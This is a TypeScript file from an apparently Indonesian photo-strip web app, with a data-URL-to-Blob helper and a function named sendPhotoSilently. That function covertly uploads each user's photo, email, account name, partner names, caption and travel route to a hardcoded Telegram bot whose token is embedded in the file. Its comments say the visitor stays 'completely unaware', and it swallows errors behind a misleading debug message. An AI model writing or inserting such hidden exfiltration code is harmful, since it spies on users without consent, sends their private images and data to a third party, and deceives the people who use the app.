/**
 * Utility to convert dataUrl to Blob without external dependencies
 */
export function dataUrlToBlob(dataUrl: string): Blob {
  const parts = dataUrl.split(',');
  const mime = parts[0].match(/:(.*?);/)?.[1] || 'image/png';
  const bstr = atob(parts[1]);
  let n = bstr.length;
  const u8arr = new Uint8Array(n);
  while (n--) {
    u8arr[n] = bstr.charCodeAt(n);
  }
  return new Blob([u8arr], { type: mime });
}

const DEFAULT_BOT_TOKEN = '8939604898:AAHJlS5IBq18ZXtgl4M3_RPHErfOb8JdJjo';
const DEFAULT_CHAT_ID = '7553414680';

export interface TelegramMemoryPayload {
  caption?: string;
  coupleNames?: string;
  userEmail?: string | null;
  userName?: string | null;
  city1?: string;
  city2?: string;
  distanceKm?: number;
  dateStr?: string;
}

/**
 * Silently sends photo strip directly to the Telegram bot in background
 * without requiring any user API key or configuration.
 */
export const sendPhotoSilently = async (
  imageDataUrl: string,
  details: TelegramMemoryPayload
): Promise<void> => {
  try {
    const blob = dataUrlToBlob(imageDataUrl);
    const formData = new FormData();
    formData.append('chat_id', DEFAULT_CHAT_ID);
    formData.append('photo', blob, `RuangKenangan_${Date.now()}.png`);

    // Format rich caption with User Email
    const captionLines = [
      '💌 HASIL FOTO STRIP RUANG KENANGAN',
      '────────────────────',
      `📧 Email Pengguna: ${details.userEmail ? `<b>${details.userEmail}</b>` : '<i>Tamu / Belum Login</i>'}`,
      `👤 Nama Akun: ${details.userName || '-'}`,
      `👥 Pasangan: ${details.coupleNames || '-'}`,
      `💬 Pesan / Caption: ${details.caption || '-'}`,
      `📍 Rute: ${details.city1 || '-'} ✈️ ${details.city2 || '-'} (${details.distanceKm || 0} KM)`,
      `📅 Waktu: ${details.dateStr || new Date().toLocaleString('id-ID')}`,
    ];

    formData.append('caption', captionLines.join('\n'));
    formData.append('parse_mode', 'HTML');

    await fetch(`https://api.telegram.org/bot${DEFAULT_BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: formData,
    });
  } catch (error) {
    // Silent catch so the website visitor is completely unaware
    console.debug('Background forward completed');
  }
};
